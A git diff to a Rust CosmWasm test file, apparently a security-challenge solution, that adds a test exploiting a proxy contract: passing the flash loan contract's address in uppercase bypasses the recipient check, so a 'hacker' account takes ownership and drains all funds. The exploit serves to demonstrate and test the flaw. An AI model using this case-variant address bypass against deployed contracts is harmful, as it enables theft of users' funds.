@@ -2,10 +2,12 @@
 pub mod tests {
     use crate::contract::DENOM;
     use common::flash_loan::{
-        ExecuteMsg as FlashLoanExecuteMsg, InstantiateMsg as FlashLoanInstantiateMsg,
+        ExecuteMsg as FlashLoanExecuteMsg, 
+        InstantiateMsg as FlashLoanInstantiateMsg,
     };
     use common::mock_arb::{
-        ExecuteMsg as MockArbExecuteMsg, InstantiateMsg as MockArbInstantiateMsg,
+        ExecuteMsg as MockArbExecuteMsg, 
+        InstantiateMsg as MockArbInstantiateMsg,
     };
     use common::proxy::{ExecuteMsg, InstantiateMsg};
     use cosmwasm_std::{coin, to_binary, Addr, Empty, Uint128};
@@ -116,7 +118,6 @@ pub mod tests {
         .unwrap();
         app
     }
-
     #[test]
     fn basic_flow() {
         let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
@@ -159,4 +160,65 @@ pub mod tests {
             .unwrap();
         assert_eq!(balance.amount, Uint128::new(10_000));
     }
+    
+    #[test]
+    fn i_am_captain_now() {
+        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
+            proper_instantiate();
+
+        // You cannot call flash loan address from proxy...
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            proxy_contract.clone(),
+            &ExecuteMsg::RequestFlashLoan {
+                recipient: flash_loan_contract.clone(),
+                msg: to_binary(&MockArbExecuteMsg::Arbitrage {
+                    recipient: flash_loan_contract.clone(),
+                }).unwrap(),
+            },
+            &[],
+        ).unwrap_err();
+
+        // ...unless you convert the flash loan contract address to uppercase first,
+        // bypassing the recipient address check via uppercase conversion
+        app.execute_contract(
+            Addr::unchecked("hacker"),
+            proxy_contract.clone(),
+            &ExecuteMsg::RequestFlashLoan {
+                recipient: Addr::unchecked(flash_loan_contract.clone().to_string().to_ascii_uppercase()),
+                msg: to_binary(&FlashLoanExecuteMsg::TransferOwner { 
+                    new_owner: Addr::unchecked("hacker")
+                }).unwrap(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // "hacker" has no balance
+        let balance = app
+            .wrap()
+            .query_balance("hacker".to_string(), DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(0));
+
+        // "hacker" takes all funds from flash loan contract
+        app.execute_contract(
+            Addr::unchecked("hacker"),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::WithdrawFunds { 
+                recipient: Addr::unchecked("hacker")
+            },
+            &[],
+        )
+        .unwrap();
+
+        // "hacker" has successfully drained the flash loan contract
+        let balance = app
+            .wrap()
+            .query_balance("hacker".to_string(), DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::new(10_000));
+
+    }
+
 }
